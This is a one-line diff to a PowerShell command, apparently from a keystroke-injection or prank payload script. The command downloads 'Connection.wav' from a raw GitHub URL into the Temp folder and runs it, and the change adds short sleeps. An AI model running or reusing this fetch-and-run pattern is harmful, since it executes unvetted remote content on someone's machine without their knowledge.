@@ -1,1 +1,1 @@
-Set-Location $env:Temp; Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/Connection.wav -O Connection.wav; .\Connection.wav
+Set-Location $env:Temp; sleep 1; Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/Connection.wav -O Connection.wav; sleep 1; .\Connection.wav
